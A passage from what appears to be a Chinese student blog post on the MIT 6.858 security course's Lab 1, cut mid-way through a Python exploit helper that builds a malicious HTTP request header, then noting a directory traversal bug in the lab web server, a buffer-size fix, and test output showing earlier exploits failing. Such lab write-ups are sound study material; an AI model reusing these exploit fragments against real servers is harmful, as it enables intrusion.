HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="lab1-exercise6"><a href="#lab1-exercise6" class="headerlink" title="lab1 exercise6"></a>lab1 exercise6</h4><p>题目让再找个漏洞，<del>这显然不是我会的</del></p>
+<p>http_serve存在文件目录穿越漏洞。</p>
+<p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<h4 id="lab1-exercise7"><a href="#lab1-exercise7" class="headerlink" title="lab1 exercise7"></a>lab1 exercise7</h4><p>把value，envvar，reqpath数组大小全部改成8192就好了</p>
+<p>make check-fixed之前的exp全部失效</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">./check-crash.sh zookd-exstack ./exploit-2.py<br>./check-crash.sh: line 36:  2730 Killed                  <span class="hljs-variable">$2</span> <span class="hljs-variable">$HOST</span> <span class="hljs-variable">$PORT</span> &gt; /dev/null<br>FAIL ./exploit-2.py<br>./check-attack.sh zookd-exstack ./exploit-4.py<br>FAIL ./exploit-4.py<br>./check-attack.sh zookd-nxstack ./exploit-5.py<br>FAIL ./exploit-5.py<br><span class="hljs-built_in">rm</span> shellcode.o<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>mit6858 Lab1</div>
+      <div>https://isolator-1.github.io/2023/12/06/学习笔记/mit6858Lab1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Isolator</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>December 6, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/" title="OS">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OS</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/05/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/" title="遇到的奇奇怪怪问题汇总">
+                        <span class="hidden-mobile">遇到的奇奇怪怪问题汇总</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
